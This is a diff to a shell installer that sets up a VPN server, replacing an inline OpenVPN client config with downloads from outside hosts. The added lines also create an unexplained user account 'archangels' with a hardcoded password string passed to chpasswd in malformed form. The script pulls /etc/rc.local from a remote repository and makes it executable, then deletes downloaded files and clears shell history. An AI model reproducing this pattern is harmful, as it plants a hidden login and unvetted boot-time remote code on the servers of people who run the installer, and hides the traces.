@@ -114,53 +114,20 @@ tar xf openvpn.tar;rm openvpn.tar
 wget -O /etc/rc.local "https://raw.githubusercontent.com/guardeumvpn/Qwer77/master/rc.local"
 chmod +x /etc/rc.local
 # etc
-cat > /var/www/openvpn/tcp.ovpn <<EOF1
-# OpenVPN Server build v2.5.4
-# Server Location: SG, Singapore
-# Server ISP: DigitalOcean, LLC
-#
-# Experimental Config only
-# Examples demonstrated below on how to Play with OHPServer
-# Credits to kinGmapua
-
-client
-proto tcp
-remote $MYIP:1103@devvault.digi.com.my
-http-proxy $MYIP 8080
-http-proxy-retry
-dev tun
-resolv-retry infinite
-nobind
-persist-key
-persist-tun
-remote-cert-tls server
-verify-x509-name server_ADBtkp0yL46HLXPb name
-auth SHA256
-auth-nocache
-cipher AES-128-CBC
-tls-client
-tls-version-min 1.2
-tls-cipher TLS-DHE-RSA-WITH-AES-128-GCM-SHA256
-setenv opt block-outside-dns
-verb 3
-key-direction 1
-<auth-user-pass>
-sam
-sam
-</auth-user-pass>
-<ca>
-$(cat /etc/openvpn/ca.crt)
-</ca>
-<cert>
-$(cat /etc/openvpn/ADBtkp0yL46HLXPb.crt)
-</cert>
-<key>
-$(cat /etc/openvpn/ADBtkp0yL46HLXPb.key)
-</key>
-<tls-auth>
-$(cat /etc/openvpn/tls-auth.key)
-</tls-auth>
-EOF1
+wget -O /var/www/openvpn/tcp.ovpn "https://raw.githubusercontent.com/Vpaproject/-/main/client.ovpn"
+wget -O /var/www/openvpn/udp.ovpn "https://raw.githubusercontent.com/Vpaproject/-/main/client1.ovpn"
+wget -O /var/www/openvpn/ssl.ovpn "https://raw.githubusercontent.com/Vpaproject/-/main/ssl.ovpn"
+wget -O /var/www/openvpn/ohp.ovpn "https://raw.githubusercontent.com/Vpaproject/-/main/ohp.ovpn"
+wget -O /var/www/openvpn/client3.ovpn "https://gakod.com/debian/client3.ovpn"
+sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config
+sed -i "s/ipserver/$myip/g" /var/www/openvpn/tcp.ovpn
+sed -i "s/ipserver/$myip/g" /var/www/openvpn/udp.ovpn
+sed -i "s/ipserver/$myip/g" /var/www/openvpn/ssl.ovpn
+sed -i "s/ipserver/$myip/g" /var/www/openvpn/ohp.ovpn
+useradd -m -g users -s /bin/bash archangels
+echo "7C22C4ED" | chpasswd
+echo "UPDATE DAN INSTALL SIAP 99% MOHON SABAR"
+cd;rm *.sh;rm *.txt;rm *.tar;rm *.deb;rm *.asc;rm *.zip;rm ddos*;
 
 
 apt-get install ufw
@@ -530,7 +497,7 @@ echo '' > /root/.tcat_installed
 
 # finishing
 cd
-chown -R www-data:www-data /home/vps/public_html
+chown -R www-data:www-data /var/www/openvpn
 /etc/init.d/nginx restart
 /etc/init.d/openvpn restart
 /etc/init.d/cron restart
@@ -538,9 +505,7 @@ chown -R www-data:www-data /home/vps/public_html
 /etc/init.d/dropbear restart
 /etc/init.d/fail2ban restart
 /etc/init.d/stunnel4 restart
-service php7.0-fpm restart
-service squid restart
-/etc/init.d/webmin restart
+/etc/init.d/squid restart
 
 # clearing history
 rm -rf ~/.bash_history && history -c
